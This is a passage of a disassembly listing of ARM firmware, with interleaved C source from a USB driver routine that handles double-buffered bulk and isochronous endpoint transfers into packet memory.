 8006fce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fd2:	681b      	ldr	r3, [r3, #0]
 8006fd4:	785b      	ldrb	r3, [r3, #1]
 8006fd6:	2b01      	cmp	r3, #1
 8006fd8:	d122      	bne.n	8007020 <USB_EPStartXfer+0x6a6>
 8006fda:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fde:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006fe2:	681b      	ldr	r3, [r3, #0]
 8006fe4:	653b      	str	r3, [r7, #80]	; 0x50
 8006fe6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fea:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006fee:	681b      	ldr	r3, [r3, #0]
 8006ff0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006ff4:	b29b      	uxth	r3, r3
 8006ff6:	461a      	mov	r2, r3
 8006ff8:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8006ffa:	4413      	add	r3, r2
 8006ffc:	653b      	str	r3, [r7, #80]	; 0x50
 8006ffe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007002:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007006:	681b      	ldr	r3, [r3, #0]
 8007008:	781b      	ldrb	r3, [r3, #0]
 800700a:	00da      	lsls	r2, r3, #3
 800700c:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800700e:	4413      	add	r3, r2
 8007010:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007014:	64fb      	str	r3, [r7, #76]	; 0x4c
 8007016:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800701a:	b29a      	uxth	r2, r3
 800701c:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 800701e:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8007020:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007024:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007028:	681b      	ldr	r3, [r3, #0]
 800702a:	891b      	ldrh	r3, [r3, #8]
 800702c:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007030:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007034:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007038:	681b      	ldr	r3, [r3, #0]
 800703a:	6959      	ldr	r1, [r3, #20]
 800703c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007040:	b29b      	uxth	r3, r3
 8007042:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007046:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800704a:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800704e:	6800      	ldr	r0, [r0, #0]
 8007050:	f001 f99f 	bl	8008392 <USB_WritePMA>
            ep->xfer_buff += len;
 8007054:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007058:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800705c:	681b      	ldr	r3, [r3, #0]
 800705e:	695a      	ldr	r2, [r3, #20]
 8007060:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007064:	441a      	add	r2, r3
 8007066:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800706a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800706e:	681b      	ldr	r3, [r3, #0]
 8007070:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8007072:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007076:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800707a:	681b      	ldr	r3, [r3, #0]
 800707c:	6a1a      	ldr	r2, [r3, #32]
 800707e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007082:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007086:	681b      	ldr	r3, [r3, #0]
 8007088:	691b      	ldr	r3, [r3, #16]
 800708a:	429a      	cmp	r2, r3
 800708c:	d90f      	bls.n	80070ae <USB_EPStartXfer+0x734>
            {
              ep->xfer_len_db -= len;
 800708e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007092:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007096:	681b      	ldr	r3, [r3, #0]
 8007098:	6a1a      	ldr	r2, [r3, #32]
 800709a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800709e:	1ad2      	subs	r2, r2, r3
 80070a0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070a4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070a8:	681b      	ldr	r3, [r3, #0]
 80070aa:	621a      	str	r2, [r3, #32]
 80070ac:	e00e      	b.n	80070cc <USB_EPStartXfer+0x752>
            }
            else
            {
              len = ep->xfer_len_db;
 80070ae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070b2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070b6:	681b      	ldr	r3, [r3, #0]
 80070b8:	6a1b      	ldr	r3, [r3, #32]
 80070ba:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 80070be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070c2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070c6:	681b      	ldr	r3, [r3, #0]
 80070c8:	2200      	movs	r2, #0
 80070ca:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 80070cc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070d0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070d4:	681b      	ldr	r3, [r3, #0]
 80070d6:	643b      	str	r3, [r7, #64]	; 0x40
 80070d8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070dc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070e0:	681b      	ldr	r3, [r3, #0]
 80070e2:	785b      	ldrb	r3, [r3, #1]
 80070e4:	2b00      	cmp	r3, #0
 80070e6:	d177      	bne.n	80071d8 <USB_EPStartXfer+0x85e>
 80070e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070ec:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070f0:	681b      	ldr	r3, [r3, #0]
 80070f2:	63bb      	str	r3, [r7, #56]	; 0x38
 80070f4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070f8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070fc:	681b      	ldr	r3, [r3, #0]
 80070fe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007102:	b29b      	uxth	r3, r3
 8007104:	461a      	mov	r2, r3
 8007106:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8007108:	4413      	add	r3, r2
 800710a:	63bb      	str	r3, [r7, #56]	; 0x38
 800710c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007110:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007114:	681b      	ldr	r3, [r3, #0]
 8007116:	781b      	ldrb	r3, [r3, #0]
 8007118:	00da      	lsls	r2, r3, #3
 800711a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800711c:	4413      	add	r3, r2
 800711e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007122:	637b      	str	r3, [r7, #52]	; 0x34
 8007124:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007126:	881b      	ldrh	r3, [r3, #0]
 8007128:	b29b      	uxth	r3, r3
 800712a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800712e:	b29a      	uxth	r2, r3
 8007130:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007132:	801a      	strh	r2, [r3, #0]
 8007134:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007138:	2b3e      	cmp	r3, #62	; 0x3e
 800713a:	d921      	bls.n	8007180 <USB_EPStartXfer+0x806>
 800713c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007140:	095b      	lsrs	r3, r3, #5
 8007142:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007146:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800714a:	f003 031f 	and.w	r3, r3, #31
 800714e:	2b00      	cmp	r3, #0
 8007150:	d104      	bne.n	800715c <USB_EPStartXfer+0x7e2>
 8007152:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007156:	3b01      	subs	r3, #1
 8007158:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 800715c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800715e:	881b      	ldrh	r3, [r3, #0]
 8007160:	b29a      	uxth	r2, r3
 8007162:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007166:	b29b      	uxth	r3, r3
 8007168:	029b      	lsls	r3, r3, #10
 800716a:	b29b      	uxth	r3, r3
 800716c:	4313      	orrs	r3, r2
 800716e:	b29b      	uxth	r3, r3
 8007170:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007174:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007178:	b29a      	uxth	r2, r3
 800717a:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800717c:	801a      	strh	r2, [r3, #0]
 800717e:	e050      	b.n	8007222 <USB_EPStartXfer+0x8a8>
 8007180:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007184:	2b00      	cmp	r3, #0
 8007186:	d10a      	bne.n	800719e <USB_EPStartXfer+0x824>
 8007188:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800718a:	881b      	ldrh	r3, [r3, #0]
 800718c:	b29b      	uxth	r3, r3
 800718e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007192:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007196:	b29a      	uxth	r2, r3
 8007198:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800719a:	801a      	strh	r2, [r3, #0]
 800719c:	e041      	b.n	8007222 <USB_EPStartXfer+0x8a8>
 800719e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071a2:	085b      	lsrs	r3, r3, #1
 80071a4:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80071a8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071ac:	f003 0301 	and.w	r3, r3, #1
 80071b0:	2b00      	cmp	r3, #0
 80071b2:	d004      	beq.n	80071be <USB_EPStartXfer+0x844>
 80071b4:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80071b8:	3301      	adds	r3, #1
 80071ba:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80071be:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071c0:	881b      	ldrh	r3, [r3, #0]
 80071c2:	b29a      	uxth	r2, r3
 80071c4:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80071c8:	b29b      	uxth	r3, r3
 80071ca:	029b      	lsls	r3, r3, #10
 80071cc:	b29b      	uxth	r3, r3
 80071ce:	4313      	orrs	r3, r2
 80071d0:	b29a      	uxth	r2, r3
 80071d2:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071d4:	801a      	strh	r2, [r3, #0]
 80071d6:	e024      	b.n	8007222 <USB_EPStartXfer+0x8a8>
 80071d8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071dc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071e0:	681b      	ldr	r3, [r3, #0]
 80071e2:	785b      	ldrb	r3, [r3, #1]
 80071e4:	2b01      	cmp	r3, #1
 80071e6:	d11c      	bne.n	8007222 <USB_EPStartXfer+0x8a8>
 80071e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071ec:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80071f0:	681b      	ldr	r3, [r3, #0]
 80071f2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80071f6:	b29b      	uxth	r3, r3
 80071f8:	461a      	mov	r2, r3
 80071fa:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80071fc:	4413      	add	r3, r2
 80071fe:	643b      	str	r3, [r7, #64]	; 0x40
 8007200:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007204:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007208:	681b      	ldr	r3, [r3, #0]
 800720a:	781b      	ldrb	r3, [r3, #0]
 800720c:	00da      	lsls	r2, r3, #3
 800720e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8007210:	4413      	add	r3, r2
 8007212:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007216:	63fb      	str	r3, [r7, #60]	; 0x3c
 8007218:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800721c:	b29a      	uxth	r2, r3
 800721e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8007220:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8007222:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007226:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800722a:	681b      	ldr	r3, [r3, #0]
 800722c:	895b      	ldrh	r3, [r3, #10]
 800722e:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007232:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007236:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800723a:	681b      	ldr	r3, [r3, #0]
 800723c:	6959      	ldr	r1, [r3, #20]
 800723e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007242:	b29b      	uxth	r3, r3
 8007244:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007248:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800724c:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007250:	6800      	ldr	r0, [r0, #0]
 8007252:	f001 f89e 	bl	8008392 <USB_WritePMA>
 8007256:	e227      	b.n	80076a8 <USB_EPStartXfer+0xd2e>
          }
        }
        /* auto Switch to single buffer mode when transfer <Mps no need to manage in double buffer */
        else
        {
          len = ep->xfer_len_db;
 8007258:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800725c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007260:	681b      	ldr	r3, [r3, #0]
 8007262:	6a1b      	ldr	r3, [r3, #32]
 8007264:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104

          /* disable double buffer mode for Bulk endpoint */
          PCD_CLEAR_BULK_EP_DBUF(USBx, ep->num);
 8007268:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800726c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007270:	681a      	ldr	r2, [r3, #0]
 8007272:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007276:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800727a:	681b      	ldr	r3, [r3, #0]
 800727c:	781b      	ldrb	r3, [r3, #0]
 800727e:	009b      	lsls	r3, r3, #2
 8007280:	4413      	add	r3, r2
 8007282:	881b      	ldrh	r3, [r3, #0]
 8007284:	b29b      	uxth	r3, r3
 8007286:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 800728a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800728e:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 8007292:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007296:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800729a:	681a      	ldr	r2, [r3, #0]
 800729c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072a0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072a4:	681b      	ldr	r3, [r3, #0]
 80072a6:	781b      	ldrb	r3, [r3, #0]
 80072a8:	009b      	lsls	r3, r3, #2
 80072aa:	441a      	add	r2, r3
 80072ac:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 80072b0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80072b4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80072b8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80072bc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80072c0:	b29b      	uxth	r3, r3
 80072c2:	8013      	strh	r3, [r2, #0]

          /* Set Tx count with nbre of byte to be transmitted */
          PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 80072c4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072c8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80072cc:	681b      	ldr	r3, [r3, #0]
 80072ce:	65fb      	str	r3, [r7, #92]	; 0x5c
 80072d0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072d4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80072d8:	681b      	ldr	r3, [r3, #0]
 80072da:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80072de:	b29b      	uxth	r3, r3
 80072e0:	461a      	mov	r2, r3
 80072e2:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80072e4:	4413      	add	r3, r2
 80072e6:	65fb      	str	r3, [r7, #92]	; 0x5c
 80072e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072ec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072f0:	681b      	ldr	r3, [r3, #0]
 80072f2:	781b      	ldrb	r3, [r3, #0]
 80072f4:	00da      	lsls	r2, r3, #3
 80072f6:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80072f8:	4413      	add	r3, r2
 80072fa:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80072fe:	65bb      	str	r3, [r7, #88]	; 0x58
 8007300:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007304:	b29a      	uxth	r2, r3
 8007306:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8007308:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 800730a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800730e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007312:	681b      	ldr	r3, [r3, #0]
 8007314:	891b      	ldrh	r3, [r3, #8]
 8007316:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800731a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800731e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007322:	681b      	ldr	r3, [r3, #0]
 8007324:	6959      	ldr	r1, [r3, #20]
 8007326:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800732a:	b29b      	uxth	r3, r3
 800732c:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007330:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007334:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007338:	6800      	ldr	r0, [r0, #0]
 800733a:	f001 f82a 	bl	8008392 <USB_WritePMA>
 800733e:	e1b3      	b.n	80076a8 <USB_EPStartXfer+0xd2e>
        }
      }
      else /* manage isochronous double buffer IN mode */
      {
        /* each Time to write in PMA xfer_len_db will */
        ep->xfer_len_db -= len;
 8007340:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007344:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007348:	681b      	ldr	r3, [r3, #0]
 800734a:	6a1a      	ldr	r2, [r3, #32]
 800734c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007350:	1ad2      	subs	r2, r2, r3
 8007352:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007356:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800735a:	681b      	ldr	r3, [r3, #0]
 800735c:	621a      	str	r2, [r3, #32]

        /* Fill the data buffer */
        if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 800735e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007362:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007366:	681a      	ldr	r2, [r3, #0]
 8007368:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800736c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007370:	681b      	ldr	r3, [r3, #0]
 8007372:	781b      	ldrb	r3, [r3, #0]
 8007374:	009b      	lsls	r3, r3, #2
 8007376:	4413      	add	r3, r2
 8007378:	881b      	ldrh	r3, [r3, #0]
 800737a:	b29b      	uxth	r3, r3
 800737c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007380:	2b00      	cmp	r3, #0
 8007382:	f000 80c6 	beq.w	8007512 <USB_EPStartXfer+0xb98>
        {
          /* Set the Double buffer counter for pmabuffer1 */
          PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8007386:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800738a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800738e:	681b      	ldr	r3, [r3, #0]
 8007390:	673b      	str	r3, [r7, #112]	; 0x70
 8007392:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007396:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800739a:	681b      	ldr	r3, [r3, #0]
 800739c:	785b      	ldrb	r3, [r3, #1]
 800739e:	2b00      	cmp	r3, #0
 80073a0:	d177      	bne.n	8007492 <USB_EPStartXfer+0xb18>
 80073a2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073a6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073aa:	681b      	ldr	r3, [r3, #0]
 80073ac:	66bb      	str	r3, [r7, #104]	; 0x68
 80073ae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073b2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073b6:	681b      	ldr	r3, [r3, #0]
 80073b8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80073bc:	b29b      	uxth	r3, r3
 80073be:	461a      	mov	r2, r3
 80073c0:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80073c2:	4413      	add	r3, r2
 80073c4:	66bb      	str	r3, [r7, #104]	; 0x68
 80073c6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073ca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073ce:	681b      	ldr	r3, [r3, #0]
 80073d0:	781b      	ldrb	r3, [r3, #0]
 80073d2:	00da      	lsls	r2, r3, #3
 80073d4:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80073d6:	4413      	add	r3, r2
 80073d8:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80073dc:	667b      	str	r3, [r7, #100]	; 0x64
 80073de:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80073e0:	881b      	ldrh	r3, [r3, #0]
 80073e2:	b29b      	uxth	r3, r3
 80073e4:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80073e8:	b29a      	uxth	r2, r3
 80073ea:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80073ec:	801a      	strh	r2, [r3, #0]
 80073ee:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073f2:	2b3e      	cmp	r3, #62	; 0x3e
 80073f4:	d921      	bls.n	800743a <USB_EPStartXfer+0xac0>
 80073f6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073fa:	095b      	lsrs	r3, r3, #5
 80073fc:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007400:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007404:	f003 031f 	and.w	r3, r3, #31
 8007408:	2b00      	cmp	r3, #0
 800740a:	d104      	bne.n	8007416 <USB_EPStartXfer+0xa9c>
 800740c:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007410:	3b01      	subs	r3, #1
 8007412:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007416:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007418:	881b      	ldrh	r3, [r3, #0]
 800741a:	b29a      	uxth	r2, r3
 800741c:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007420:	b29b      	uxth	r3, r3
 8007422:	029b      	lsls	r3, r3, #10
 8007424:	b29b      	uxth	r3, r3
 8007426:	4313      	orrs	r3, r2
 8007428:	b29b      	uxth	r3, r3
 800742a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800742e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007432:	b29a      	uxth	r2, r3
 8007434:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007436:	801a      	strh	r2, [r3, #0]
 8007438:	e050      	b.n	80074dc <USB_EPStartXfer+0xb62>
 800743a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800743e:	2b00      	cmp	r3, #0
 8007440:	d10a      	bne.n	8007458 <USB_EPStartXfer+0xade>
 8007442:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007444:	881b      	ldrh	r3, [r3, #0]
 8007446:	b29b      	uxth	r3, r3
 8007448:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800744c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007450:	b29a      	uxth	r2, r3
 8007452:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007454:	801a      	strh	r2, [r3, #0]
 8007456:	e041      	b.n	80074dc <USB_EPStartXfer+0xb62>
 8007458:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800745c:	085b      	lsrs	r3, r3, #1
 800745e:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007462:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007466:	f003 0301 	and.w	r3, r3, #1
 800746a:	2b00      	cmp	r3, #0
 800746c:	d004      	beq.n	8007478 <USB_EPStartXfer+0xafe>
 800746e:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007472:	3301      	adds	r3, #1
 8007474:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007478:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800747a:	881b      	ldrh	r3, [r3, #0]
 800747c:	b29a      	uxth	r2, r3
 800747e:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007482:	b29b      	uxth	r3, r3
 8007484:	029b      	lsls	r3, r3, #10
 8007486:	b29b      	uxth	r3, r3
 8007488:	4313      	orrs	r3, r2
 800748a:	b29a      	uxth	r2, r3
 800748c:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800748e:	801a      	strh	r2, [r3, #0]
 8007490:	e024      	b.n	80074dc <USB_EPStartXfer+0xb62>
 8007492:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007496:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800749a:	681b      	ldr	r3, [r3, #0]
 800749c:	785b      	ldrb	r3, [r3, #1]
 800749e:	2b01      	cmp	r3, #1
 80074a0:	d11c      	bne.n	80074dc <USB_EPStartXfer+0xb62>
 80074a2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074a6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80074aa:	681b      	ldr	r3, [r3, #0]
 80074ac:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80074b0:	b29b      	uxth	r3, r3
 80074b2:	461a      	mov	r2, r3
 80074b4:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80074b6:	4413      	add	r3, r2
 80074b8:	673b      	str	r3, [r7, #112]	; 0x70
 80074ba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074be:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074c2:	681b      	ldr	r3, [r3, #0]
 80074c4:	781b      	ldrb	r3, [r3, #0]
 80074c6:	00da      	lsls	r2, r3, #3
 80074c8:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80074ca:	4413      	add	r3, r2
 80074cc:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80074d0:	66fb      	str	r3, [r7, #108]	; 0x6c
 80074d2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074d6:	b29a      	uxth	r2, r3
 80074d8:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 80074da:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr1;
 80074dc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074e0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074e4:	681b      	ldr	r3, [r3, #0]
 80074e6:	895b      	ldrh	r3, [r3, #10]
 80074e8:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80074ec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074f0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074f4:	681b      	ldr	r3, [r3, #0]
 80074f6:	6959      	ldr	r1, [r3, #20]
 80074f8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074fc:	b29b      	uxth	r3, r3
